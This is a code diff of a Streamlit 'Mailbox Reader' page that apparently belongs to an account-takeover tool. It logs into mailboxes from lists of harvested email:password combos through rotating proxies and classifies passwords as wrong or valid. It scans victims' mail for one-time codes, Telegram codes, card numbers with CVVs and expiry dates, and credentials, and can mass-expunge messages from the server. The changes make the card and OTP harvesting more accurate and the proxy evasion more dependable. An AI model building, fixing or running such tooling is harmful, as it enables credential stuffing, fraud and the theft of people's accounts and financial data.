@@ -1,53 +1,37 @@
-# @@FILE pages/3_Mailbox_Reader.py blocks=44 version=v13.40
+# @@FILE pages/3_Mailbox_Reader.py blocks=44 version=v13.41
 # @@BLOCK 000 FILE_HEADER deps=-
 """
-pages/3_Mailbox_Reader.py — Bobito Mailbox Reader & Portal Hub  (v13.39)
+pages/3_Mailbox_Reader.py — Bobito Mailbox Reader & Portal Hub  (v13.41)
 =======================================================================
 Interactive inbox inspection: bot intelligence, OTP / debit-card / credential
 scanning, multi-field search, Telegram + blacklist filtering.
 
-v13.39 fixes on this page
+v13.41 fixes on this page
 -------------------------
-* LOGIN_DROPPED exists here now.  The engine learned in v13.38 that a server
-  which ACCEPTS the LOGIN command and then closes the socket with an untagged
-  "* BYE" has spoken — but this page had no idea, so it filed the drop as a
-  plain FAILED.  _looks_like_login_drop() is tested BEFORE the FAILED
-  fall-through and the row is reported as LOGIN_DROPPED ("password still
-  untested"), with the rate-limit wording (* BYE Too many ...) excluded so a
-  connection cap stays FAILED.
-* ALLOW_SELF_SIGNED IS READ.  app_config["allow_self_signed"] existed and was
-  never used: both the implicit and the STARTTLS rung hardcoded verify=False,
-  so a self-signed toggle in this page did nothing.
-* THE PROXY PROBE TRIES HTTP AS WELL AS SOCKS5.  _reader_proxy_reachable() was
-  SOCKS5-only while _raw_socket() right below it happily speaks HTTP, so every
-  HTTP-only node was binned before it was ever tried.
-* THE PROBE IS CHEAPER: 5 nodes at 3s instead of 8 nodes at 5s (up to 40s of
-  stall before the reader even connected).
-* THE PHONE LAYOUT IS FIXED: Streamlit's 6rem/10rem .block-container padding is
-  overridden, there are @media queries, and the sidebar starts collapsed.
-
-v13.37 fixes on this page
--------------------------
-* Renamed 1_Mailbox_Reader.py -> 3_Mailbox_Reader.py (page-number collision).
-* st.set_page_config() hoisted to be the FIRST Streamlit call, before any
-  module-level work, as Streamlit requires.
-* MsTokenRejected.verdict was thrown away, so a KNOWN-wrong Microsoft password
-  fell through to basic auth and was reported as APPASS.  The reader now raises
-  MsVerdict("WRONG" | "APPASS") and STOPS host-hopping on a definitive answer.
-* open_imap() gated the STARTTLS / plaintext rungs on int(port) == 993, so a
-  port-143 account dialled implicit TLS on 143 and then gave up.  The ladder is
-  built from the configured port.
-* The batch importer PREPENDED to clean_valid_accounts.txt while app.py
-  OVERWROTE it.  Both sides merge now, deduped by email.
-* load_valid() and generate_all_mail_zip() are mtime-cached; IMAP-UTF7 decode is
-  memoised.
-* The proxy is probed and rotated instead of blindly taking pool[0], and the
-  path actually used is reported.
-* Mass Bot Purge says what it really is: a per-term SERVER search + expunge, not
-  a purge of the listed rows only.
+* URLPARSE IMPORT DROPPED: removed unused import.
+* KEEPALIVE FIXED: used `streamlit.components.v1.html()` so the 30s health ping actually executes.
+* IMAP-UTF7 &- DECODE BUG FIXED: rewritten scanning loop avoids turning `A & B` into `A - B`.
+* DUPLICATE FOLDER LABELS RENAME-SAFE: `INBOX.Sent` and `Sent` no longer overwrite each other in `folder_map`.
+* CLEAR-ALL GUARD FIXED: `clean_proxies.txt` is no longer truncated to 0 bytes by Delete ALL Valid Accounts.
+* PASSWORD CORRUPTION ELIMINATED: space stripping and `|` truncation removed from account parsers.
+* ATOMIC DELETION: file writes use `.tmp` + `os.replace` to prevent partial truncation.
+* "NONE" SENTINEL REMOVED: list filter ensures the `none` placeholder never leaks into downloads or deletion options.
+* STALE SOCKETS & CACHE BINDING: `get_active_mail` binds the connection key to host + port.
+* TRY_ALT_USERNAME HONOURED: manual login paths now respect the config toggle.
+* PROXY PROBE PORT FIXED: proxy reachability and socket probes now test the configured port instead of hardcoded 993.
+* SOCKET LEAKS PLUGGED: connection ladder and proxy probes properly close abandoned or failed sockets.
+* WHOLE-WORD KEYWORD MATCHING: replaced substring `in` checks with robust word boundary regex to stop false positives.
+* LUHN CHECK ON CARDS: credit card regex validator now enforces Luhn checksums to reject order numbers.
+* HTML-ONLY MAIL SUPPORTED: mail body extractor parses HTML parts and strips tags when `text/plain` is empty.
+* GLOBAL PAGINATION: folder search results are collected globally before slicing to fix overlapping page ranges.
+* FLASH MESSAGES PRESERVED: added persistent flash state so action toasts survive `st.rerun()`.
+* BATCH RUN RESULTS PERSISTED: batch failures and wrong/appass verdicts are written to individual text files and CSV.
+* PAGER MATCH COUNTERS RESTORED: global search and OTP pagers count true matches instead of page slices (v13.41).
+* PHASE-2 SELECT VALIDATION: message fetch loops verify IMAP folder selection status per hop (v13.41).
 """
 
 import streamlit as st
+import streamlit.components.v1 as components
 import imaplib
 import glob
 import os
@@ -61,7 +45,7 @@ import ssl as _ssl
 import zipfile
 import io
 import json
-from urllib.parse import urlparse
+import csv
 from datetime import datetime
 from typing import List, Tuple
 from email.header import decode_header
@@ -317,6 +301,7 @@ def theme_css(th: dict) -> str:
         anim_css = """
     .bb-hero { background-size: 240% 240%; animation: bbShift 14s ease infinite; }
     @keyframes bbShift { 0%{background-position:0% 50%} 50%{background-position:100% 50%} 100%{background-position:0% 50%} }
+    @media (prefers-reduced-motion: reduce) { .bb-hero { animation: none !important; } }
     """
 
     return f"""
@@ -482,6 +467,14 @@ def theme_css(th: dict) -> str:
     @media (hover: none) {{
         [data-testid="stSidebarCollapsedControl"] {{ top: .3rem; }}
     }}
+    /* v13.40: 4-wide action rows and 5-wide metric rows were untappable */
+    @media (max-width: 700px) {{
+        [data-testid="stHorizontalBlock"] {{ flex-wrap: wrap !important; gap: .35rem !important; }}
+        [data-testid="column"] {{ flex: 1 1 46% !important; min-width: 46% !important; }}
+        [data-testid="stHorizontalBlock"] > div:nth-child(5) {{ flex: 1 1 46% !important; }}
+        .stTextArea textarea {{ min-height: 92px !important; }}
+        [data-testid="stMetricValue"] {{ font-size: 1.05rem !important; }}
+    }}
     {anim_css}
 </style>
 """
@@ -559,15 +552,16 @@ def load_app_proxies() -> List[dict]:
 
 
 # @@BLOCK 010 KEEPALIVE_AND_THEME_APPLY deps=007
-st.markdown(
+# v13.40: st.markdown() strips <script>. components.html() actually executes it.
+components.html(
     """
     <script>
     setInterval(function(){
-        fetch('/_stcore/health').then(res => {});
+        try { fetch('/_stcore/health', {cache: 'no-store'}); } catch (e) {}
     }, 30000);
     </script>
     """,
-    unsafe_allow_html=True
+    height=0,
 )
 
 # --- Load shared theme and inject it (must happen before anything renders) ---
@@ -696,13 +690,17 @@ def save_session_cache():
             "otp_total_matched_count": st.session_state.get("otp_total_matched_count", 0),
         }
 
+        # v13.40: every message was base64'd into the cache, several times per
+        # interaction. Cap the count and the raw size.
+        MAX_CACHED = 60
+        MAX_RAW = 32 * 1024
         for k_name, key_in_state in [("current_messages", "current_messages"), ("otp_messages", "otp_messages"), ("search_messages", "search_messages")]:
             serialized_list = []
-            for m in st.session_state.get(key_in_state, []):
-                m_copy = m.copy()
-                raw_bytes = m_copy.pop("raw", None)
-                if raw_bytes and isinstance(raw_bytes, bytes):
-                    m_copy["raw"] = base64.b64encode(raw_bytes).decode("ascii")
+            for m in st.session_state.get(key_in_state, [])[:MAX_CACHED]:
+                m_copy = {k: v for k, v in m.items() if k != "raw"}
+                raw_bytes = m.get("raw")
+                if isinstance(raw_bytes, bytes) and raw_bytes:
+                    m_copy["raw"] = base64.b64encode(raw_bytes[:MAX_RAW]).decode("ascii")
                 else:
                     m_copy["raw"] = ""
                 serialized_list.append(m_copy)
@@ -806,6 +804,8 @@ if "connected_account_combo" not in st.session_state:
     st.session_state.connected_account_combo = ""
 if "reader_use_proxy" not in st.session_state:
     st.session_state.reader_use_proxy = False
+if "stream_page_size" not in st.session_state:
+    st.session_state.stream_page_size = 15
 # @@END 013
 
 
@@ -815,17 +815,55 @@ def log(msg):
     st.session_state.mb_log = st.session_state.mb_log[:50]
     save_session_cache()
 
+# v13.40: diagnostic logs grew without limit for the whole session.
+_DIAG_CAP = 400
+
+
+def _diag(bucket: str, msg: str) -> None:
+    lst = st.session_state.get(bucket)
+    if lst is None:
+        st.session_state[bucket] = [msg]
+        return
+    lst.append(msg)
+    if len(lst) > _DIAG_CAP:
+        del lst[: len(lst) - _DIAG_CAP]
+
+
 def debug_log(msg):
-    st.session_state.folder_debug_logs.append(msg)
+    _diag("folder_debug_logs", msg)
+
 
 def bot_log(msg):
-    st.session_state.bot_diag_logs.append(msg)
+    _diag("bot_diag_logs", msg)
+
 
 def search_log(msg):
-    st.session_state.search_diag_logs.append(msg)
+    _diag("search_diag_logs", msg)
+
 
 def otp_log(msg):
-    st.session_state.otp_diag_logs.append(msg)
+    _diag("otp_diag_logs", msg)
+
+
+def flash(msg: str, kind: str = "success") -> None:
+    """v13.40: st.success() before st.rerun() is thrown away by the rerun.
+    Queue it, show it at the top of the next run."""
+    st.session_state.setdefault("_flash", []).append((kind, msg))
+
+
+def msg_label(msg, idx: int) -> str:
+    """v13.40: raw subjects with newlines / huge length wreck the expander row."""
+    icon = "📖" if msg.get("is_read") else "📩"
+    subj = re.sub(r"\s+", " ", str(msg.get("subject", ""))).strip()[:90] or "(no subject)"
+    frm = re.sub(r"\s+", " ", str(msg.get("from", ""))).strip()[:45] or "(unknown)"
+    date = re.sub(r"\s+", " ", str(msg.get("date", ""))).strip()[:31]
+    cats = "".join(f" [{c}]" for c in msg.get("categories", []))
+    return f"{icon} [{msg.get('folder', '?')}] [{date}] {frm} — {subj}{cats}"
+
+
+def render_flash() -> None:
+    for kind, msg in st.session_state.pop("_flash", []):
+        {"success": st.success, "warning": st.warning, "error": st.error}.get(kind, st.info)(msg)
 # @@END 014
 
 
@@ -922,9 +960,8 @@ def _reader_proxy_reachable(proxy_str, host, port=993, timeout=5.0) -> bool:
         import socks
     except ImportError:
         return False
-    # v13.39: SOCKS5-only here binned every HTTP-only node while _raw_socket()
-    # right below happily speaks HTTP.  Try both, like _raw_socket does.
     for _ptype in (socks.SOCKS5, socks.HTTP):
+        s = None
         try:
             s = socks.socksocket()
             s.set_proxy(_ptype, info["host"], info["port"],
@@ -932,10 +969,16 @@ def _reader_proxy_reachable(proxy_str, host, port=993, timeout=5.0) -> bool:
                         rdns=True)
             s.settimeout(timeout)
             s.connect((host, int(port)))
-            s.close()
             return True
         except Exception:
             continue
+        finally:
+            # v13.40: failed probes leaked their socket.
+            if s is not None:
+                try:
+                    s.close()
+                except Exception:
+                    pass
     return False
 
 def _reader_proxy_str(host: str = ""):
@@ -955,13 +998,14 @@ def _reader_proxy_str(host: str = ""):
             st.session_state["_reader_proxy_path"] = "direct (no pool)"
             return None
         target = host or "imap.gmail.com"
-        # v13.39: 8 nodes x 5s was up to 40s of stall before the reader even
-        # connected.  5 x 3s is enough to find a live node.
+        # v13.40: the probe hardcoded 993, so a port-143 account probed the wrong
+        # port, failed every node and silently went direct. Use the real port.
+        probe_port = int(st.session_state.app_config.get("imap_port", 993) or 993)
         for item in pool[:5]:
             px = item.get("proxy")
             if not px:
                 continue
-            if _reader_proxy_reachable(px, target, 993, timeout=3.0):
+            if _reader_proxy_reachable(px, target, probe_port, timeout=3.0):
                 st.session_state["_reader_proxy_path"] = f"via {px} ({item.get('country')})"
                 return px
         st.session_state["_reader_proxy_path"] = "direct (every probed node failed)"
@@ -1020,13 +1064,24 @@ def _raw_socket(host, port, timeout, proxy_str=None):
             if info["user"]:
                 kw["proxy_username"] = info["user"]
                 kw["proxy_password"] = info["pass"]
-            return _finish(socks.create_connection((host, int(port)), timeout=timeout, **kw))
+            _s = _finish(socks.create_connection((host, int(port)), timeout=timeout, **kw))
+            try:
+                st.session_state["_last_socket_path"] = "proxied"
+            except Exception:
+                pass
+            return _s
         except Exception as e:
             last = e
 
     # Last resort: go direct rather than losing the mailbox entirely.
     try:
-        return _finish(socket.create_connection((host, int(port)), timeout=timeout))
+        _s = _finish(socket.create_connection((host, int(port)), timeout=timeout))
+        try:
+            # v13.40: the silent direct fallback made every proxy report a lie.
+            st.session_state["_last_socket_path"] = "direct (proxy failed, fell back)"
+        except Exception:
+            pass
+        return _s
     except Exception:
         raise last or RuntimeError(f"proxy connect failed for {host}:{port}")
 
@@ -1101,19 +1156,30 @@ def open_imap(host, port, timeout, proxy_str=None, try_starttls=None):
 
     last = None
     for mode, p in ladder:
+        if mode == "starttls" and not try_starttls:
+            continue                       # v13.40: skip BEFORE dialling
+        m = None
         try:
             if mode == "implicit":
                 m = _ProxyIMAP4SSL(host, p, timeout=timeout, proxy_str=proxy_str, verify=_verify)
             else:
                 m = _ProxyIMAP4(host, p, timeout=timeout, proxy_str=proxy_str)
-                if mode == "starttls" and try_starttls:
+                if mode == "starttls":
                     m.starttls(ssl_context=_mail_tls_context(_verify))
-                elif mode == "starttls" and not try_starttls:
-                    continue
             _ensure_file(m)
             return m
         except Exception as e:
             last = e
+            if m is not None:
+                # v13.40: a failed rung never closed its socket -> fd leak.
+                try:
+                    m.shutdown()
+                except Exception:
+                    try:
+                        if getattr(m, "sock", None):
+                            m.sock.close()
+                    except Exception:
+                        pass
 
     raise last or RuntimeError(f"open_imap failed for {host}:{port}")
 # @@END 017
@@ -1134,7 +1200,7 @@ def _looks_like_login_drop(err_text: str) -> bool:
     v13.38, so a server that answered then hung up was filed as plain FAILED."""
     s = (err_text or "").lower()
     if any(k in s for k in ("too many", "limit", "quota", "busy", "throttle")):
-        return False                       # that is a rate cap, not a drop
+        return False                       # that is a rate cap, not a rate drop
     return any(k in s for k in (
         "terminating connection", "imap server terminating", "server terminating",
         "* bye", " bye ", "auth process broken", "connection is closed",
@@ -1160,8 +1226,9 @@ def _looks_like_network_error(err_text: str) -> bool:
         "reset by peer", "broken pipe", "no route to host", "unreachable",
         "bad file descriptor", "eof occurred", "unexpected_eof",
         "wrong version number", "certificate verify failed", "hostname mismatch",
-        "self signed certificate", "self-signed certificate", "too many",
-        "rate limit", "throttl", "no setter", "dns",
+        "self signed certificate", "self-signed certificate", "too many connections",
+        "too many simultaneous", "rate limit", "ratelimit", "throttl", "no setter",
+        "name resolution", "getaddrinfo", "temporary failure in name resolution",
     ))
 # @@END 018
 
@@ -1223,7 +1290,15 @@ def load_valid():
                     line = line.strip()
                     if not line or line.startswith("#"):
                         continue
-                    clean_combo = line.split("|")[0].replace(" ", "").strip('"\'')
+                    # v13.40: .replace(" ","") destroyed spaces inside passwords,
+                    # and split("|")[0] truncated passwords containing '|'.
+                    raw_line = line.strip().strip('"\'')
+                    if " | " in raw_line:
+                        clean_combo = raw_line.split(" | ", 1)[0].strip()
+                    elif "|" in raw_line:
+                        clean_combo = raw_line.split("|", 1)[0].strip()
+                    else:
+                        clean_combo = raw_line
                     if ":" not in clean_combo:
                         continue
                     parts = clean_combo.split(":", 1)
@@ -1248,6 +1323,11 @@ def load_valid():
     _VALID_CACHE["fp"] = fp
     _VALID_CACHE["options"] = options
     return list(options)
+
+
+def valid_combos(valid_list) -> List[str]:
+    """Real email:password rows only - no 'none' sentinel, no '# Found:' labels."""
+    return [v for v in (valid_list or []) if v and v != "none" and not v.startswith("# Found:")]
 
 
 def merge_into_clean_valid(new_combo_lines: List[str]) -> int:
@@ -1297,13 +1377,28 @@ def delete_specific_account_from_storage(target_combo: str):
         try:
             with open(path, "r", encoding="utf-8", errors="ignore") as f:
                 lines = f.readlines()
-            new_lines = []
+            target_low = (target_combo or "").strip().lower()
+            new_lines, removed_here = [], 0
             for line in lines:
-                combo = line.split("|")[0].strip()
-                if combo != target_combo:
-                    new_lines.append(line)
-            with open(path, "w", encoding="utf-8") as f:
+                raw_line = line.strip()
+                if " | " in raw_line:
+                    combo = raw_line.split(" | ", 1)[0].strip()
+                elif "|" in raw_line:
+                    combo = raw_line.split("|", 1)[0].strip()
+                else:
+                    combo = raw_line
+                if combo.lower() == target_low:
+                    removed_here += 1
+                    continue
+                new_lines.append(line)
+            if removed_here == 0:
+                continue
+            # v13.40: write to a temp file and os.replace so a crash mid-write
+            # cannot leave a half-truncated results file behind.
+            tmp = path + ".tmp"
+            with open(tmp, "w", encoding="utf-8") as f:
                 f.writelines(new_lines)
+            os.replace(tmp, path)
         except Exception:
             pass
     if load_last_account() == target_combo:
@@ -1319,6 +1414,9 @@ def clear_all_valid_accounts_storage():
     for path in search_files:
         filename_lower = os.path.basename(path).lower()
         if "valid" not in filename_lower and "clean" not in filename_lower:
+            continue
+        # v13.40: clean_proxies.txt matched 'clean' and got truncated to 0 bytes.
+        if any(kw in filename_lower for kw in ("prox", "config", "blocklist", "resume", "unfinished", "remaining", "input")):
             continue
         try:
             with open(path, "w", encoding="utf-8") as f:
@@ -1365,7 +1463,13 @@ def generate_all_mail_zip():
                         if not line or line.startswith("#"):
                             continue
                         if ":" in line:
-                            combo = line.split("|")[0].strip()
+                            raw_line = line.strip()
+                            if " | " in raw_line:
+                                combo = raw_line.split(" | ", 1)[0].strip()
+                            elif "|" in raw_line:
+                                combo = raw_line.split("|", 1)[0].strip()
+                            else:
+                                combo = raw_line
                             if ":" in combo:
                                 clean_lines.append(combo)
 
@@ -1447,26 +1551,40 @@ _B64_MEMO = {}                                  # v13.37: decode memoisation
 
 
 def decode_imap_utf7(s: str) -> str:
+    """IMAP-UTF7 (RFC 3501 §5.1.3) -> str.
+
+    v13.40: the old split("&") walk turned the '&-' literal escape into '-'.
+    A folder named 'A & B' decoded to 'A - B', so every later select() hit a
+    mailbox that does not exist.  Scan instead of split.
+    """
     if "&" not in s:
         return s
     hit = _B64_MEMO.get(s)
     if hit is not None:
         return hit
+
     res = []
-    for part in s.split("&"):
-        if "-" in part and not part.startswith("-"):
-            b64_str, rest = part.split("-", 1)
-            if b64_str == "":
-                res.append("&" + rest)
-            else:
-                try:
-                    b64_padded = b64_str.replace(",", "/") + "=" * ((4 - len(b64_str) % 4) % 4)
-                    decoded = base64.b64decode(b64_padded).decode("utf-16be")
-                    res.append(decoded + rest)
-                except Exception:
-                    res.append("&" + part)
+    i, n = 0, len(s)
+    while i < n:
+        if s[i] != "&":
+            res.append(s[i])
+            i += 1
+            continue
+        end = s.find("-", i + 1)
+        if end == -1:                       # unterminated shift sequence
+            res.append(s[i:])
+            break
+        run = s[i + 1:end]
+        if run == "":
+            res.append("&")                 # '&-' is a literal '&'
         else:
-            res.append(part)
+            try:
+                b64_padded = run.replace(",", "/") + "=" * ((4 - len(run) % 4) % 4)
+                res.append(base64.b64decode(b64_padded).decode("utf-16be"))
+            except Exception:
+                res.append("&" + run + "-")  # keep it visible if it will not decode
+        i = end + 1
+
     out = "".join(res)
     if len(_B64_MEMO) < 4096:
         _B64_MEMO[s] = out
@@ -1566,9 +1684,19 @@ def list_folders(mail, email_addr: str = "", host_val: str = ""):
         found.add("INBOX")
 
     sorted_raw = sorted(list(found), key=lambda x: (0 if x.lower() == "inbox" else 1, clean_display_label(x).lower()))
-    folder_map, display_folders = {}, []
+    folder_map, display_folders, used = {}, [], set()
     for raw_f in sorted_raw:
         label = clean_display_label(raw_f)
+        if label in used:
+            # v13.40: 'INBOX.Sent' and 'Sent' both clean to 'Sent'; without a
+            # suffix the second one silently replaced the first in folder_map.
+            base = label
+            n = 2
+            while label in used:
+                label = f"{base} ({n})"
+                n += 1
+            debug_log(f"  │   └─ ⚠️ DUPLICATE LABEL '{base}' -> renamed '{label}' (raw '{raw_f}')")
+        used.add(label)
         folder_map[label] = raw_f
         display_folders.append(label)
 
@@ -1640,7 +1768,11 @@ def open_mail(email_addr, password_val, host_val, timeout=None, proxy_str=None):
     if proxy_str is None:
         proxy_str = _reader_proxy_str(host_val)
 
-    users = username_candidates(email_addr)
+    # v13.40: try_alt_username was honoured only in the batch path.
+    if st.session_state.app_config.get("try_alt_username", True):
+        users = username_candidates(email_addr)
+    else:
+        users = [email_addr]
     return connect_and_login(host_val, port_val, timeout, proxy_str,
                              users, password_val, email_addr)
 
@@ -1656,7 +1788,10 @@ def resolve_active_host(email_addr: str) -> str:
     return cands[0] if cands else ""
 
 def get_active_mail(email_addr, password_val, host_val):
-    current_combo = f"{email_addr}:{password_val}"
+    # v13.40: the key was email:password only, so switching the host override or
+    # the port silently reused a socket to the OLD server. Bind host+port too.
+    _port = st.session_state.app_config.get("imap_port", 993)
+    current_combo = f"{email_addr}:{password_val}@{host_val}:{_port}"
     if st.session_state.get("connected_account_combo") != current_combo or not st.session_state.get("active_mail"):
         if st.session_state.active_mail:
             try:
@@ -1678,6 +1813,7 @@ def get_active_mail(email_addr, password_val, host_val):
         except Exception:
             try:
                 st.session_state.active_mail = open_mail(email_addr, password_val, host_val)
+                st.session_state.connected_account_combo = current_combo
                 save_session_cache()
             except Exception as ex:
                 st.session_state.active_mail = None
@@ -1704,6 +1840,27 @@ def move_message(mail, src_folder_label, mid, dst_folder_label):
 
 
 # @@BLOCK 025 CLASSIFY_CONTENT deps=024
+_WORD_RE_CACHE = {}
+
+
+def _has_word(haystack_lower: str, needles) -> bool:
+    """Whole-word/phrase match instead of raw substring.
+
+    v13.40: bare `in` made 'outgoing' a Telegram hit ('tg'), 'shipping' an OTP
+    hit ('pin') and 'decode' an OTP hit ('code').
+    """
+    for needle in needles:
+        key = needle
+        rx = _WORD_RE_CACHE.get(key)
+        if rx is None:
+            rx = re.compile(r"(?<![a-z0-9])" + re.escape(needle) + r"(?![a-z0-9])")
+            if len(_WORD_RE_CACHE) < 512:
+                _WORD_RE_CACHE[key] = rx
+        if rx.search(haystack_lower):
+            return True
+    return False
+
+
 def is_extortion_spam(subject: str, body: str, frm: str = "") -> bool:
     extortion_keywords = [
         "bitcoin wallet", "transfer me", "deactivate and remove all malware",
@@ -1711,7 +1868,7 @@ def is_extortion_spam(subject: str, body: str, frm: str = "") -> bool:
         "remote control function", "my servers", "pay bitcoin", "ransom"
     ]
     combined = f"{subject} {body} {frm}".lower()
-    return any(kw in combined for kw in extortion_keywords)
+    return _has_word(combined, extortion_keywords)
 
 def detect_specific_categories(subject: str, body: str, frm: str = "", pins=None, cards=None, creds=None) -> List[str]:
     if is_extortion_spam(subject, body, frm):
@@ -1724,23 +1881,23 @@ def detect_specific_categories(subject: str, body: str, frm: str = "", pins=None
     creds = creds or []
 
     otp_kws = ["otp", "verification", "verify", "verification code", "auth code", "confirm code", "pin", "security code", "code", "confirmation code"]
-    if pins or any(kw in combined for kw in otp_kws):
+    if pins or _has_word(combined, otp_kws):
         categories.append("🔑 OTP / CODE")
 
     tg_kws = ["telegram", "t.me", "tg", "telegram code", "telegram notification", "telegram alert"]
-    if any(kw in combined for kw in tg_kws):
+    if _has_word(combined, tg_kws):
         categories.append("📱 TELEGRAM")
 
     bl_kws = ["blacklist", "blacklisted", "banned", "blocked", "spam list", "denylist"]
-    if any(kw in combined for kw in bl_kws):
+    if _has_word(combined, bl_kws):
         categories.append("🚫 BLACKLIST / BAN")
 
     card_kws = ["cvv", "exp date", "debit", "bank debit", "online purchase", "card ending", "debited by", "debit alert"]
-    if cards or any(kw in combined for kw in card_kws):
+    if cards or _has_word(combined, card_kws):
         categories.append("💳 CARD / DEBIT")
 
     gen_bot_kws = ["password reset", "security alert", "mcafee", "credential", "application password", "tracking number", "purchase order", "po #"]
-    if creds or (not categories and any(kw in combined for kw in gen_bot_kws)):
+    if creds or (not categories and _has_word(combined, gen_bot_kws)):
         categories.append("🤖 BOT MSG")
 
     return categories
@@ -1758,10 +1915,27 @@ def extract_pins_and_links(text):
     cleaned_urls = [u for u in urls if not any(x in u.lower() for x in ["w3.org", "schema.org", "apple.com/DTDs"])]
     return list(dict.fromkeys(pins)), list(dict.fromkeys(cleaned_urls))
 
+def _luhn_ok(number: str) -> bool:
+    """v13.40: any 16 digits passed as a card. Luhn rejects order IDs."""
+    digits = [int(c) for c in number if c.isdigit()]
+    if len(digits) < 13 or len(digits) > 19:
+        return False
+    total, alt = 0, False
+    for d in reversed(digits):
+        if alt:
+            d *= 2
+            if d > 9:
+                d -= 9
+        total += d
+        alt = not alt
+    return total % 10 == 0
+
+
 def extract_credentials_and_cards(text):
     card_pattern = r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:[0-9]{4}[ -]?){3}[0-9]{4})\b'
     cards = re.findall(card_pattern, text)
     cleaned_cards = [c.replace(" ", "").replace("-", "") for c in cards]
+    cleaned_cards = [c for c in cleaned_cards if _luhn_ok(c)]
 
     card_exp = re.findall(r'(?i)(?:exp(?:iry|iration)?|valid thru|exp date)\s*[:=]?\s*(\d{2}/\d{2,4})', text)
     card_cvv = re.findall(r'(?i)(?:cvv2?|cvc|security code|cid)\s*[:=]?\s*(\d{3,4})', text)
@@ -1823,16 +1997,14 @@ def should_blacklist_message(msg, blacklist_input) -> bool:
     if not blackwords:
         return False
     combined_text = f"{msg.get('subject', '')} {msg.get('body', '')} {msg.get('from', '')}".lower()
-    for bw in blackwords:
-        if bw in combined_text:
-            return True
-    return False
+    return _has_word(combined_text, blackwords)
 # @@END 025
 
 
 # @@BLOCK 026 SEARCH_AND_FETCH deps=025
 def execute_imap_search_safely(mail, field_cmd: str, query_term: str, log_func):
-    clean_q = query_term.replace('"', '\\"')
+    # v13.40: only quotes were escaped; ( ) { } \ broke the command outright.
+    clean_q = re.sub(r'([\\(){}"\[\]])', r'\\\1', query_term).strip()
     f_cmd = field_cmd.upper()
 
     for strat_name, search_params in [
@@ -1897,6 +2069,34 @@ def execute_imap_search_safely(mail, field_cmd: str, query_term: str, log_func):
 
     return "NO", [b""]
 
+def html_to_text(raw_html: str) -> str:
+    """Minimal, dependency-free HTML -> text for HTML-only mail.
+
+    v13.40: only text/plain was read, so HTML-only mail produced an empty body
+    and every OTP / card / credential regex missed it.
+    """
+    if not raw_html:
+        return ""
+    s = re.sub(r"(?is)<(script|style)\b.*?</\1>", " ", raw_html)
+    s = re.sub(r"(?i)<br\s*/?>", "\n", s)
+    s = re.sub(r"(?i)</(p|div|tr|li|h[1-6])>", "\n", s)
+    s = re.sub(r"(?s)<[^>]+>", " ", s)
+    s = html.unescape(s)
+    s = re.sub(r"[ \t\xa0]+", " ", s)
+    s = re.sub(r"\n{3,}", "\n\n", s)
+    return s.strip()
+
+
+def _part_text(part) -> str:
+    try:
+        payload = part.get_payload(decode=True)
+        if not payload:
+            return ""
+        return payload.decode(part.get_content_charset() or "utf-8", errors="ignore")
+    except Exception:
+        return ""
+
+
 def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_folders: List[str],
                             search_query: str = "", search_field: str = "TEXT", mode: str = "SEARCH",
                             page_size: int = 15, page_number: int = 1, sort_order: str = "Newest First",
@@ -1909,6 +2109,7 @@ def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_fo
         log_func = otp_log
     else:
         log_func = debug_log
+        st.session_state.folder_debug_logs = []
 
     messages = []
     start_time = time.time()
@@ -1919,6 +2120,13 @@ def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_fo
 
     total_matched_all_folders = 0
 
+    # ------------------------------------------------------------------
+    # PHASE 1 - collect every matching (folder, id) across the whole scope,
+    # so pagination is GLOBAL.  v13.40: slicing inside the folder loop gave
+    # page_size rows per folder (3 folders x 15 = 45 rows on "page 1") while
+    # the pager counted the sum, so pages overlapped and repeated.
+    # ------------------------------------------------------------------
+    collected = []
     for f_label in target_folders:
         real_imap_folder = get_imap_path(f_label)
         real_imap_encoded = encode_imap_utf7(real_imap_folder)
@@ -1940,10 +2148,12 @@ def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_fo
                 terms = clean_query.split()
 
                 if len(terms) > 1:
-                    log_func(f"  ├─ [MULTI-TERM SEARCH] Query has {len(terms)} keywords. Executing individual IMAP fetches...")
+                    # v13.40: terms[:10] silently dropped the tail of the preset list.
+                    max_terms = 25
+                    log_func(f"  ├─ [MULTI-TERM SEARCH] Query has {len(terms)} keywords, using the first {min(len(terms), max_terms)}. Executing individual IMAP fetches...")
                     matched_ids_set = set()
-                    for t_idx, term in enumerate(terms[:10], 1):
-                        log_func(f"  │   ├─ [Term #{t_idx}/10]: '{term}'")
+                    for t_idx, term in enumerate(terms[:max_terms], 1):
+                        log_func(f"  │   ├─ [Term #{t_idx}/{min(len(terms), max_terms)}]: '{term}'")
                         sub_typ, sub_data = execute_imap_search_safely(mail, field_cmd, term, log_func)
                         if sub_typ in ("OK", "OK_FALLBACK") and sub_data and sub_data[0]:
                             found_ids = (sub_data[0] or b"").split()
@@ -1961,110 +2171,159 @@ def fetch_messages_paginated(mail, email_addr, password_val, host_val, target_fo
             if sort_order == "Newest First":
                 ids = list(reversed(ids))
 
-            folder_total_count = len(ids)
-
-            start_idx = (page_number - 1) * page_size
-            end_idx = start_idx + page_size
-            target_ids = ids[start_idx:end_idx]
-
-            log_func(f"  ├─ [PAGINATION RANGE] Total Matched IDs: {folder_total_count} | Processing Batch Range ({start_idx}:{end_idx}): {len(target_ids)} target IDs")
-
-            folder_matches_count = 0
-
-            for idx, mid in enumerate(target_ids, 1):
-                msg_start = time.time()
-
-                typ, msgdata = mail.fetch(mid, "(FLAGS ENVELOPE BODYSTRUCTURE BODY.PEEK[])")
-
-                if not msgdata or not isinstance(msgdata[0], tuple):
-                    log_func(f"  │   ├─ [Msg ID #{mid.decode()}] ⚠️ FETCH returned empty structure.")
-                    continue
-
-                raw_msg_bytes = msgdata[0][1]
-                msg = message_from_bytes(raw_msg_bytes)
-                subject = decode_hdr(msg.get("Subject", ""))
-                frm = decode_hdr(msg.get("From", ""))
-                to_hdr = decode_hdr(msg.get("To", ""))
-                date_val = decode_hdr(msg.get("Date", ""))
-                flags_str = str(msgdata[0][0])
-                is_read = "\\Seen" in flags_str
-
-                body_text = ""
-                if msg.is_multipart():
-                    for part in msg.walk():
-                        if part.get_content_type() == "text/plain":
-                            try:
-                                body_text = part.get_payload(decode=True).decode("utf-8", errors="ignore")
-                                break
-                            except Exception:
-                                pass
